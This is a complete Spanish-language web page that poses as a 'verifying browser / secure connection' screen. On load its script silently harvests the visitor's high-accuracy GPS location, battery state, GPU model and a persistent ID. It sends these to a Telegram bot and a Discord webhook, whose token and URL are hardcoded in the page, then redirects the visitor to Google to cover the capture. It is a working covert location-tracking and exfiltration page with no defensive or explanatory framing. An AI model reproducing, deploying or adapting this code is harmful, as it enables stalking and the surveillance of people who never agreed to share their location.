<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; color: #70757a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>Confirmando conexión segura...</p>
    </div>

    <script>
        const CONFIG = {
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            exit: "https://www.google.com"
        };

        async function iniciar() {
            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
            localStorage.setItem('_sid', id);

            let bat = "hubo problemas con este criterio";
            try {
                const b = await navigator.getBattery();
                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
            } catch(e) {}

            let hw = "hubo problemas con este criterio";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (p) => enviar(p, id, hw, bat),
                    () => enviar(null, id, hw, bat),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                enviar(null, id, hw, bat);
            }
        }

        async function enviar(pos, id, hw, bat) {
            let gpsTxt = "hubo problemas con esta criterio (GPS)";
            let inlineKeyboard = [];

            if (pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
                
                inlineKeyboard = [[
                    { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
                ]];
            }

            const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Coords:** ${gpsTxt}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            try {
                // El uso de await aquí garantiza que el código espere a que los mensajes se envíen
                await Promise.all([
                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CONFIG.chat,
                            text: report,
                            parse_mode: "Markdown",
                            reply_markup: inlineKeyboard.length > 0 ? { inline_keyboard: inlineKeyboard } : undefined
                        })
                    }),
                    fetch(CONFIG.webhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                    })
                ]);
            } catch(e) {
                console.error("Error en el envío");
            } finally {
                // La redirección SOLO ocurre después de que el bloque try/catch termine
                window.location.href = CONFIG.exit;
            }
        }

        window.onload = iniciar;
    </script>
</body>
</html>
